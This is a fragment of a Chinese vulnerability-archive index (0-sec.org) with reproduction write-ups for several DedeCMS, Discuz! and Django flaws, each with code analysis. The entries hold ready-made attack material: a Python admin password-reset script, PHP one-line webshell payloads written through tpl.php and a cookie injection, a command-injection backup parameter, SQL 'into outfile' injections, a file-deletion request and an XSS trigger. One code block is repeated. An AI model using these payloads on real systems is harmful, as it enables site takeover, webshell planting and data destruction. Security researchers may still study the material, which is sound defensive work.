s.get(dede_host + \"/member/index.php\") if \"class=\\\"userName\\\">admin\" in rs.text: print \"Administrator login successful !!\" headers = {\"Referer\": dede_host + \"member/edit_baseinfo.php\"} rs = s.get(dede_host + 'include/vdimgck.php').content file = open('2.jpg', \"wb\") file.write(rs) file.close() vdcode = raw_input(\"Please enter the verification code : \") data = {\"dopost\": \"save\", \"uname\": \"admin\", \"oldpwd\": oldpwd, \"userpwd\": newpwd, \"userpwdok\": newpwd, \"safequestion\": \"0\", \"newsafequestion\": \"0\", \"sex\": \"男\", \"email\": \"admin@admin.com\", \"vdcode\": vdcode} rs = s.post(dede_host + '/member/edit_baseinfo.php', data=data) if \"成功更新你的基本资料\" in rs.content: print \"Administrator password modified successfully !!\" print \"The new administrator password is : \" + newpwd else: print \"attack fail\" 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-29 21:20:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/会员CVE-2018-20129.html":{"url":"0day/Dedecms/会员CVE-2018-20129.html","title":"【开启会员注册】（CVE-2018-20129）Dedecms前台文件上传漏洞","keywords":"","body":"（CVE-2018-20129）Dedecms前台文件上传漏洞 一、漏洞简介 管理员用户前台可以绕过限制上传shell 二、漏洞影响 三、复现过程 代码分析 漏洞在于用户发布文章上传图片处。处理文件在/include/dialog/select_images_post.php 而上传文件存在全局过滤/include/uploadsafe.inc.php #/include/uploadsafe.inc.php $cfg_not_allowall = \"php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml\"; if(!empty(${$_key.'_name'}) && (preg_match(\"#\\.(\".$cfg_not_allowall.\")$#i\",${$_key.'_name'}) || !preg_match(\"#\\.#\", ${$_key.'_name'})) ) { if(!defined('DEDEADMIN')) { exit('Not Admin Upload filetype not allow !'); } } $imtypes = array ( \"image/pjpeg\", \"image/jpeg\", \"image/gif\", \"image/png\", \"image/xpng\", \"image/wbmp\", \"image/bmp\" ); if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes)) { $image_dd = @getimagesize($$_key); if (!is_array($image_dd)) { exit('Upload filetype not allow !'); } } 可以看到名字中不得有上述字符，且限制了content-type。按道理说直接限制不得存在的字符，似乎没有问题了，可在发布文章文件上传的处理文件select_images_post.php中存在如下代码： $imgfile_name = trim(preg_replace(\"#[ \\r\\n\\t\\*\\%\\\\\\/\\?>再次过滤了图片名，并且再次判断如上三种文件类型是否存在其中。这么一次过滤，直接粗暴的将一些特殊字符替换为空，那么我们就可以通过特殊字符绕过上面的全局文件名不能包含php字符的限制，比如文件名为1.jpg.p*hp 复现 登录并进入member/article_add.php发布文章，选择下面的富文本编辑器插入图片 选择好shell并上传抓包 向如上分析修改文件名与content-type，即可返回shell地址 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-29 21:26:13 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/CNVD-2018-01221.html":{"url":"0day/Dedecms/CNVD-2018-01221.html","title":"（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞","keywords":"","body":"（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞 一、漏洞简介 DedeCMS V5.7 SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell 二、漏洞影响 三、复现过程 需要登录后台 根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件 代码分析 (1)此处定义了一个savetagfile的函数，首先做一个判断，参数“action”是否等于savetagfile，如果等于，就进行下一步 (2)csrf_chack(),这里有一个csrf检验的函数，我们需要加上token来绕过，token是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。 (3)正则表达式匹配，详情参见https://www.runoob.com/regexp/regexp-rule.html* [a-z0-9_-]{1,}的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的\\.意思是匹配小数点 所以最终那个判断条件的意思是如果参数filename不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要.lib.php结尾。 (4)preg_replace的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下,发现得到的$tagname的值为moonsec (5)stripslashes()的作用是引用用一个引用字符串，此处没有多大的作用 (6)最后是把$content里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个csrf防护之外，其他并没有什么安全措施， 导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿webshell了 根据上面的代码知道要上传的参数有：action,token,filename,content.现在只剩下获取token了，要怎么才能获取到token呢？我们再去tpl.php里看一下，发现action的参数有很多，比如del，upoladok，edit，upload等等，但只有传入upload的时候页面才会回显正常，而其他的都会显示token异常，所以只能通过action=upload来获取token。 漏洞复现 获取token http://0-sec.org/dede/tpl.php?action=upload 然后查看网页源代码，找到token 构造payload如下 http://0-sec.org/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&action=savetagfile&content=%3C?php%20phpinfo();?%3E&token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token) 访问了成功写入 访问写入的文件 http://0-sec.org/include/taglib/（你上传的文件名）.lib.php 也可以构造一句话木马payload http://0-sec.org/dede5.7/dede/tpl.php?filename=caidao.lib.php&action=savetagfile&content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&token=2d7ef87e9828edaad2d7b6bbe37f1929 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-29 20:06:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/CVE-2018-9175.html":{"url":"0day/Dedecms/CVE-2018-9175.html","title":"（CVE-2018-9175）Dedecms V5.7后台的两处getshell","keywords":"","body":"（CVE-2018-9175）Dedecms V5.7后台的两处getshell 一、漏洞简介 后台写配置文件过滤不足导致写shell。 二、漏洞影响 三、复现过程 漏洞代码分析 第一个 在/dede/sys_verifies.php中的第152行处 else if ($action == 'getfiles') { if(!isset($refiles)) { ShowMsg(\"你没进行任何操作！\",\"sys_verifies.php\"); exit(); } $cacheFiles = DEDEDATA.'/modifytmp.inc'; $fp = fopen($cacheFiles, 'w'); fwrite($fp, ''); fclose($fp); 可以看到，这里会将$refiles数组中的内容写入配置文件modifytmp.inc中。 dedecms对于输入是全局过滤的，在/common.inc.php中注册并过滤了外部提交的变量 function _RunMagicQuotes(&$svar) { if(!get_magic_quotes_gpc()) { if( is_array($svar) ) { foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { if( strlen($svar)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$svar) ) { exit('Request var not allow!'); } $svar = addslashes($svar); } } return $svar; } if (!defined('DEDEREQUEST')) { //检查和注册外部提交的变量 (2011.8.10 修改登录时相关过滤) function CheckRequest(&$val) { if (is_array($val)) { foreach ($val as $_k=>$_v) { if($_k == 'nvarname') continue; CheckRequest($_k); CheckRequest($val[$_k]); } } else { if( strlen($val)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$val) ) { exit('Request var not allow!'); } } } //var_dump($_REQUEST);exit; CheckRequest($_REQUEST); CheckRequest($_COOKIE); foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) { if($_k == 'nvarname') ${$_k} = $_v; else ${$_k} = _RunMagicQuotes($_v); } } } function _RunMagicQuotes(&$svar) { if(!get_magic_quotes_gpc()) { if( is_array($svar) ) { foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { if( strlen($svar)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$svar) ) { exit('Request var not allow!'); } $svar = addslashes($svar); } } return $svar; } if (!defined('DEDEREQUEST')) { //检查和注册外部提交的变量 (2011.8.10 修改登录时相关过滤) function CheckRequest(&$val) { if (is_array($val)) { foreach ($val as $_k=>$_v) { if($_k == 'nvarname') continue; CheckRequest($_k); CheckRequest($val[$_k]); } } else { if( strlen($val)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$val) ) { exit('Request var not allow!'); } } } //var_dump($_REQUEST);exit; CheckRequest($_REQUEST); CheckRequest($_COOKIE); foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) { if($_k == 'nvarname') ${$_k} = $_v; else ${$_k} = _RunMagicQuotes($_v); } } } 可以看到，这里会将$refiles数组中的内容写入配置文件modifytmp.inc中。 dedecms对于输入是全局过滤的，在/common.inc.php中注册并过滤了外部提交的变量 function _RunMagicQuotes(&$svar) { if(!get_magic_quotes_gpc()) { if( is_array($svar) ) { foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { if( strlen($svar)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$svar) ) { exit('Request var not allow!'); } $svar = addslashes($svar); } } return $svar; } if (!defined('DEDEREQUEST')) { //检查和注册外部提交的变量 (2011.8.10 修改登录时相关过滤) function CheckRequest(&$val) { if (is_array($val)) { foreach ($val as $_k=>$_v) { if($_k == 'nvarname') continue; CheckRequest($_k); CheckRequest($val[$_k]); } } else { if( strlen($val)>0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#',$val) ) { exit('Request var not allow!'); } } } //var_dump($_REQUEST);exit; CheckRequest($_REQUEST); CheckRequest($_COOKIE); foreach(Array('_GET','_POST','_COOKIE') as $_request) { foreach($$_request as $_k => $_v) { if($_k == 'nvarname') ${$_k} = $_v; else ${$_k} = _RunMagicQuotes($_v); } } } 上面的$refiles就是注册的外部变量，可见已经addlashes了而我们还是需要绕过fwrite($fp, '$files['.$i.'] = \"'.$filename.'\";'.\"\\r\\n\"); 实现注入shell，首先需要注入就必须闭合双引号，在这里有个诡异的操作 $filename = substr($filename,3,strlen($filename)-3); 去掉了输入的前三个字符，这样就为我们写shell制造了机会，当我们输入\\\" 时经过addlashes会变成\\\\\"，再去掉前三个字符就只剩下双引号实现闭合。 此时写入shell后只要再找一个包含modifytmp.inc文件的文件就好了，全局搜索一下可以发现就在本文件/dede/sys_verifies.php 第二个 同样是写配置文件，位于/dede/sys_cache_up.php else if($step == 2) { include_once(DEDEINC.\"/enums.func.php\"); WriteEnumsCache(); //WriteAreaCache(); 已过期 ShowMsg(\"成功更新枚举缓存，准备更新调用缓存...\", \"sys_cache_up.php?dopost=ok&step=3&uparc=$uparc\"); exit(); } 跟进WriteEnumsCache() function WriteEnumsCache($egroup='') { global $dsql; $egroups = array(); if($egroup=='') { $dsql->SetQuery(\"SELECT egroup FROM `#@__sys_enum` GROUP BY egroup \"); } else { $dsql->SetQuery(\"SELECT egroup FROM `#@__sys_enum` WHERE egroup='$egroup' GROUP BY egroup \"); } $dsql->Execute('enum'); while($nrow = $dsql->GetArray('enum')) { $egroups[] = $nrow['egroup']; } foreach($egroups as $egroup) { $cachefile = DEDEDATA.'/enums/'.$egroup.'.php'; $fp = fopen($cachefile,'w'); fwrite($fp,'SetQuery(\"SELECT ename,evalue,issign FROM `#@__sys_enum` WHERE egroup='$egroup' ORDER BY disorder ASC, evalue ASC \"); $dsql->Execute('enum'); $issign = -1; $tenum = false; //三级联动标识 while($nrow = $dsql->GetArray('enum')) { fwrite($fp,\"\\$em_{$egroup}s['{$nrow['evalue']}'] = '{$nrow['ename']}';\\r\\n\"); if($issign==-1) $issign = $nrow['issign']; if($nrow['issign']==2) $tenum = true; } if ($tenum) $dsql->ExecuteNoneQuery(\"UPDATE `#@__stepselect` SET `issign`=2 WHERE egroup='$egroup'; \"); fwrite($fp,'?'.'>'); fclose($fp); if(empty($issign)) WriteEnumsJs($egroup); } return '成功更新所有枚举缓存！'; } 可以看到，直接从数据库中读取并写入php文件中，从数据库中取出后并没有经过过滤。 将shell写进数据库中 http://0-sec.org/dede/stepselect_main.php?action=addenum_save&ename=123&egroup=;phpinfo();//&islogin=1 复现 因为包含是在同一个文件，所以直接输入 http://0-sec.org/dede/sys_verifies.php?action=getfiles&refiles[]=123&refiles[]=\\%22;phpinfo();die();// 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-29 21:06:21 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Dedecms/CVE-2019-8362.html":{"url":"0day/Dedecms/CVE-2019-8362.html","title":"（CVE-2019-8362）dedecms v5.7 sp2 后台文件上传 getshell","keywords":"","body":"（CVE-2019-8362）dedecms v5.7 sp2 后台文件上传 getshell 一、漏洞简介 上传zip文件解压缩对于文件名过滤不周，导致getshell 二、漏洞影响 三、复现过程 代码分析 /dede/album_add.php 175行验证后缀 $fm->GetMatchFiles($tmpzipdir,\"jpg|png|gif\",$imgs); 进入函数： function GetMatchFiles($indir, $fileexp, &$filearr) { $dh = dir($indir); while($filename = $dh->read()) { $truefile = $indir.'/'.$filename; if($filename == \".\" || $filename == \"..\") { continue; } else if(is_dir($truefile)) { $this->GetMatchFiles($truefile, $fileexp, $filearr); } else if(preg_match(\"/\\.(\".$fileexp.\")/i\",$filename)) { $filearr[] = $truefile; } } $dh->close(); } 可以确定preg_match(\"/.(\".$fileexp.\")/i\",$filename)只是判断了文件名中是否存在.jpg、.png、.gif中的一个，只要构造1.jpg.php就可以绕过。 复现 1、首先构造一个文件名为1.jpg.php的文件，内容为 2、将该文件进行压缩 3、在常用操作-文件式管理器处上传压缩文件到soft目录下 4、访问dede/album_add.php，选择从 从ZIP压缩包中解压图片 5、发布预览 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-29 20:15:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Discuz/3.html":{"url":"0day/Discuz/3.html","title":"Discuz!X 3.4 任意文件删除漏洞","keywords":"","body":"Discuz!X 3.4 任意文件删除漏洞 一、漏洞简介 二、漏洞影响 影响版本：Discuz!X ≤3.4 三、复现过程 漏洞分析 Discuz!X的码云已经更新修复了该漏洞 https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574 核心问题在upload/source/include/spacecp/spacecp_profile.php 跟入代码70行 if(submitcheck('profilesubmit')) { 当提交profilesubmit时进入判断，跟入177行 我们发现如果满足配置文件中某个formtype的类型为file，我们就可以进入判断逻辑，这里我们尝试把配置输出出来看看 我们发现formtype字段和条件不符，这里代码的逻辑已经走不进去了 我们接着看这次修复的改动，可以发现228行再次引入语句unlink @unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]); 回溯进入条件 当上传文件并上传成功，即可进入unlink语句 然后回溯变量$space[$key],不难发现这就是用户的个人设置。 只要找到一个可以控制的变量即可，这里选择了birthprovince。 在设置页面直接提交就可以绕过字段内容的限制了。 成功实现了任意文件删除 漏洞复现 访问http://your-ip/robots.txt可见robots.txt是存在的： 注册用户后，在个人设置页面找到自己的formhash： 带上自己的Cookie、formhash发送如下数据包： POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1 Host: localhost Content-Length: 367 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,en;q=0.6 Cookie: [your cookie] Connection: close ------WebKitFormBoundaryPFvXyxL45f34L12s Content-Disposition: form-data; name=\"formhash\" [your formhash] ------WebKitFormBoundaryPFvXyxL45f34L12s Content-Disposition: form-data; name=\"birthprovince\" ../../../robots.txt ------WebKitFormBoundaryPFvXyxL45f34L12s Content-Disposition: form-data; name=\"profilesubmit\" 1 ------WebKitFormBoundaryPFvXyxL45f34L12s-- 提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态： 说明我们的脏数据已经进入数据库了。 然后，新建一个upload.html，代码如下，将其中的[your-ip]改成discuz的域名，[form-hash]改成你的formhash： 用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。 再次访问http://your-ip/robots.txt，发现文件成功被删除： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-29 15:16:03 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Discuz/1.html":{"url":"0day/Discuz/1.html","title":"Discuz！ML 3.x代码执行漏洞","keywords":"","body":"Discuz!ML 3.x代码执行漏洞 一、漏洞简介 漏洞类型：代码执行漏洞漏洞原因：Discuz!ML 系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。 二、影响范围 Discuz!ML V3.2-3.4 三、复现过程 cookie字段中会出现xxxx_xxxx_language字段，根本原因就是这个字段存在注入，导致的RCE抓包找到cookie的language的值修改为 xxxx_xxxx_language=sc'.phpinfo().' getshell %27.%2Bfile_put_contents%28%27shell.php%27%2Curldecode%28%27%253C%253Fphp%2520eval%2528%2524_POST%255B%25221%2522%255D%2529%253B%253F%253E%27%29%29.%27 实际为： '.+file_put_contents('shell.php',urldecode('')).' 即可在路径下生成shell.php，连接密码为1 https://github.com/ianxtianxt/discuz-ml-rce 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-29 15:05:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Discuz/2.html":{"url":"0day/Discuz/2.html","title":"Discuz! X系列全版本后台Sql注入漏洞","keywords":"","body":"Discuz!X 系列全版本后台Sql注入漏洞 一、漏洞简介 利用条件： 1.知道网站的绝对路径 2.secure_file_priv的值为空 二、漏洞影响 Discuz! X系列全版本 截止到 Discuz! X3.4 R20191201 UTF-8 三、复现过程 挖过discuz 漏洞的都知道 它会对大部分传参进来的值进行过滤和校验 ，所以当时找了一个二次注入的点 uc_server\\model\\base.php 37行 base(); } function base() { $this->init_var(); $this->init_db(); $this->init_cache(); $this->init_app(); $this->init_user(); $this->init_template(); $this->init_note(); //跟进 $this->init_mail(); } uc_server\\model\\base.php 198行 开始 function init_note() { if($this->note_exists()) { //跟进 $this->load('note'); $_ENV['note']->send(); } } function note_exists() { $noteexists = $this->db->result_first(\"SELECT value FROM \".UC_DBTABLEPRE.\"vars WHERE name='noteexists\".UC_APPID.\"'\"); //从配置文件取值UC_APPID return FALSE; } else { return TRUE; } } 查找UC_APPID source\\admincp\\admincp_setting.php 2523行 $settingnew = $_GET['settingnew']; //传入 if($operation == 'credits') { $extcredits_exists = 0; foreach($settingnew['extcredits'] as $val) { if(isset($val['available']) && $val['available'] == 1) { $extcredits_exists = 1; break; } } if(!$extcredits_exists) { cpmsg('setting_extcredits_must_available'); } if($settingnew['report_reward']) { $settingnew['report_reward']['min'] = intval($settingnew['report_reward']['min']); $settingnew['report_reward']['max'] = intval($settingnew['report_reward']['max']); if($settingnew['report_reward']['min'] > $settingnew['report_reward']['max']) { unset($settingnew['report_reward']); } if($settingnew['report_reward']['min'] == $settingnew['report_reward']['max']) { $settingnew['report_reward'] = array('min' => '', 'max' => ''); } $settingnew['report_reward'] = serialize($settingnew['report_reward']); } $settingnew['creditspolicy'] = @dunserialize($setting['creditspolicy']); $settingnew['creditspolicy']['lowerlimit'] = array(); foreach($settingnew['lowerlimit'] as $key => $value) { if($settingnew['extcredits'][$key]['available']) { $settingnew['creditspolicy']['lowerlimit'][$key] = (float)$value; } } unset($settingnew['lowerlimit']); } if($operation == 'uc' && is_writeable('./config/config_ucenter.php') && $isfounder) { require_once './config/config_ucenter.php'; $ucdbpassnew = $settingnew['uc']['dbpass'] == '********' ? addslashes(UC_DBPW) : addslashes($settingnew['uc']['dbpass']); $settingnew['uc']['key'] = addslashes($settingnew['uc']['key'] == '********' ? addslashes(UC_KEY) : $settingnew['uc']['key']); if(function_exists(\"mysql_connect\") && ini_get(\"mysql.allow_local_infile\")==\"1\" && constant(\"UC_DBHOST\") != $settingnew['uc']['dbhost']){ cpmsg('uc_config_load_data_local_infile_error', '', 'error'); } if($settingnew['uc']['connect']) { $uc_dblink = function_exists(\"mysql_connect\") ? @mysql_connect($settingnew['uc']['dbhost'], $settingnew['uc']['dbuser'], $ucdbpassnew, 1) : new mysqli($settingnew['uc']['dbhost'], $settingnew['uc']['dbuser'], $ucdbpassnew); if(!$uc_dblink) { cpmsg('uc_database_connect_error', '', 'error'); } else { if(function_exists(\"mysql_connect\")) { mysql_close($uc_dblink); } else { $uc_dblink->close(); } } } $fp = fopen('./config/config_ucenter.php', 'r'); $configfile = fread($fp, filesize('./config/config_ucenter.php')); $configfile = trim($configfile); $configfile = substr($configfile, -2) == '?>' ? substr($configfile, 0, -2) : $configfile; fclose($fp); $connect = ''; $settingnew['uc'] = daddslashes($settingnew['uc']); if($settingnew['uc']['connect']) { $connect = 'mysql'; $samelink = ($dbhost == $settingnew['uc']['dbhost'] && $dbuser == $settingnew['uc']['dbuser'] && $dbpw == $ucdbpassnew); $samecharset = !($dbcharset == 'gbk' && UC_DBCHARSET == 'latin1' || $dbcharset == 'latin1' && UC_DBCHARSET == 'gbk'); $configfile = str_replace(\"define('UC_DBHOST', '\".addslashes(UC_DBHOST).\"')\", \"define('UC_DBHOST', '\".$settingnew['uc']['dbhost'].\"')\", $configfile); $configfile = str_replace(\"define('UC_DBUSER', '\".addslashes(UC_DBUSER).\"')\", \"define('UC_DBUSER', '\".$settingnew['uc']['dbuser'].\"')\", $configfile); $configfile = str_replace(\"define('UC_DBPW', '\".addslashes(UC_DBPW).\"')\", \"define('UC_DBPW', '\".$ucdbpassnew.\"')\", $configfile); if(!preg_match('/^[\\w\\d\\_]+$/', $settingnew['uc']['dbtablepre']) || !preg_match('/^[\\w\\d\\_]+$/', $settingnew['uc']['dbname'])) { cpmsg('uc_config_write_error', '', 'error'); } $configfile = str_replace(\"define('UC_DBNAME', '\".addslashes(UC_DBNAME).\"')\", \"define('UC_DBNAME', '\".$settingnew['uc']['dbname'].\"')\", $configfile); $configfile = str_replace(\"define('UC_DBTABLEPRE', '\".addslashes(UC_DBTABLEPRE).\"')\", \"define('UC_DBTABLEPRE', '`\".$settingnew['uc']['dbname'].'`.'.$settingnew['uc']['dbtablepre'].\"')\", $configfile); } $configfile = str_replace(\"define('UC_CONNECT', '\".addslashes(UC_CONNECT).\"')\", \"define('UC_CONNECT', '\".$connect.\"')\", $configfile); $configfile = str_replace(\"define('UC_KEY', '\".addslashes(UC_KEY).\"')\", \"define('UC_KEY', '\".$settingnew['uc']['key'].\"')\", $configfile); $configfile = str_replace(\"define('UC_API', '\".addslashes(UC_API).\"')\", \"define('UC_API', '\".$settingnew['uc']['api'].\"')\", $configfile); $configfile = str_replace(\"define('UC_IP', '\".addslashes(UC_IP).\"')\", \"define('UC_IP', '\".$settingnew['uc']['ip'].\"')\", $configfile); $configfile = str_replace(\"define('UC_APPID', '\".addslashes(UC_APPID).\"')\", \"define('UC_APPID', '\".$settingnew['uc']['appid'].\"')\", $configfile); $fp = fopen('./config/config_ucenter.php', 'w'); if(!($fp = @fopen('./config/config_ucenter.php', 'w'))) { cpmsg('uc_config_write_error', '', 'error'); } @fwrite($fp, trim($configfile)); // 写入到config_ucenter.php 可控UC_APPID 的值 通过上面代码可以看出来只简单的addslashes了一下 @fclose($fp); } isset($settingnew['regname']) && empty($settingnew['regname']) && $settingnew['regname'] = 'register'; isset($settingnew['reglinkname']) && empty($settingnew['reglinkname']) && $settingnew['reglinkname'] = cplang('reglinkname_default'); $nohtmlarray = array('bbname', 'regname', 'reglinkname', 'icp', 'sitemessage', 'site_qq'); foreach($nohtmlarray as $k) { if(isset($settingnew[$k])) { $settingnew[$k] = dhtmlspecialchars($settingnew[$k]); } } if(isset($settingnew['statcode'])) { $settingnew['statcode'] = preg_replace('/language\\s*=[\\s|\\'|\\\"]*php/is', '_', $settingnew['statcode']); $settingnew['statcode'] = str_replace(array(''), array(''), $settingnew['statcode']); } 转义一次的字符串被写人文件中，在PHP解析时就是没有转义过的原始内容 造成了二次注入的产生 漏洞验证 直接构造语句 1' into outfile 'c:\\\\wamp64\\\\tmp\\\\1.txt' -- a 构造报错注入 补充： UCenter 应用 ID填入exp，然后提交 1' union select 'abc' into outfile 'c:\\6.txt' -- a 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-29 15:05:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Discuz/CVE-2018-14729.html":{"url":"0day/Discuz/CVE-2018-14729.html","title":"（CVE-2018-14729）Discuz! X1.5 ~ X2.5 后台数据库备份功能远程命令执行 Getshell","keywords":"","body":"（CVE-2018-14729）Discuz!X 1.5 ~ X2.5 后台数据库备份功能远程命令执行 Getshell 一、漏洞简介 二、漏洞影响 Discuz! 1.5-2.5 三、复现过程 漏洞分析 需要注意的是这个漏洞其实是需要登录后台的，并且能有数据库备份权限，所以比较鸡肋。 我这边是用Discuz! 2.5完成漏洞复现的，并用此进行漏洞分析的。 漏洞点在： source/admincp/admincp_db.php 第296行： @shell_exec($mysqlbin.'mysqldump --force --quick '.($db->version() > '4.1' ? '--skip-opt --create-options' : '-all').' --add-drop-table'.($_GET['extendins'] == 1 ? ' --extended-insert' : '').''.($db->version() > '4.1' && $_GET['sqlcompat'] == 'MYSQL40' ? ' --compatible=mysql40' : '').' --host=\"'.$dbhost.($dbport ? (is_numeric($dbport) ? ' --port='.$dbport : ' --socket=\"'.$dbport.'\"') : '').'\" --user=\"'.$dbuser.'\" --password=\"'.$dbpw.'\" \"'.$dbname.'\" '.$tablesstr.' > '.$dumpfile); 在shell_exec()函数中可控点在$tablesstr，向上看到第281行： $tablesstr = ''; foreach($tables as $table) { $tablesstr .= '\"'.$table.'\" '; } 跟一下$table的获取流程，在上面的第143行： if($_GET['type'] == 'discuz' || $_GET['type'] == 'discuz_uc') { $tables = arraykeys2(fetchtablelist($tablepre), 'Name'); } elseif($_GET['type'] == 'custom') { $tables = array(); if(empty($_GET['setup'])) { $tables = C::t('common_setting')->fetch('custombackup', true); } else { C::t('common_setting')->update('custombackup', empty($_GET['customtables'])? '' : $_GET['customtables']); $tables = & $_GET['customtables']; } if( !is_array($tables) || empty($tables)) { cpmsg('database_export_custom_invalid', '', 'error'); } } 可以看到： C::t('common_setting')->update('custombackup', empty($_GET['customtables'])? '' : $_GET['customtables']); $tables = & $_GET['customtables']; 首先会从$_GET的数组中获取customtables字段的内容，判断内容是否为空，不为空则将从外部获取到的customtables字段内容写入common_setting表的skey=custombackup的svalue字段，写入过程中会将这个字段做序列化存储： 之后再将该值赋给$tables。 至此可以看到漏洞产生的原因是由于shell_exec()中的$tablesstr可控，导致代码注入。 漏洞复现 首先抓个包 这样可以抓到符合我们条件的请求包。 接下来只需要将customtables的内容更改一下就可以造成命令执行了： customtables[] = pre_common_admincp_cmenu\">aaa; echo '' > phpinfo.php # 效果为： 参考链接 https://github.com/FoolMitAh/CVE-2018-14729/blob/master/Discuz_backend_getshell.md https://www.anquanke.com/post/id/158270 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-29 15:05:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Django/CVE-2017-12794.html":{"url":"0day/Django/CVE-2017-12794.html","title":"（CVE-2017-12794）Django debug page XSS漏洞","keywords":"","body":"（CVE-2017-12794）Django debug page XSS漏洞 一、漏洞简介 Django 发布了新版本1.11.5，修复了500页面中可能存在的一个 XSS 漏洞 二、漏洞影响 Django 三、复现过程 经过我的测试，我发现在使用Postgres数据库并触发异常的时候，psycopg2会将字段名和字段值全部抛出。那么，如果字段值中包含我们可控的字符串，又由于0x02中说到的，这个字符串其实就会被设置成__cause__，最后被显示在页面中。 所以我们假设有如下场景： 用户注册页面，未检查用户名 注册一个用户名为alert(1)的用户 再次注册一个用户名为alert(1)的用户 触发duplicate key异常，导致XSS漏洞 访问http://www.0-sec.org:8000/create_user/?username=alert(1)创建一个用户，成功；再次访问http://www.0-sec.org:8000/create_user/?username=alert(1)，触发异常： 可见，Postgres抛出的异常为 duplicate key value violates unique constraint \"xss_user_username_key\" DETAIL: Key (username)=(alert(1)) already exists. 这个异常被拼接进The above exception () was the direct cause of the following exception，最后触发XSS。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-29 15:23:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Django/CVE-2018-14574.html":{"url":"0day/Django/CVE-2018-14574.html","title":"（CVE-2018-14574）Django < 2.0.8 任意URL跳转漏洞","keywords":"","body":"（CVE-2018-14574）Django 一、漏洞简介 Django默认配置下，如果匹配上的URL路由中最后一位是/，而用户访问的时候没加/，Django默认会跳转到带/的请求中。（由配置项中的django.middleware.common.CommonMiddleware、APPEND_SLASH来决定）。 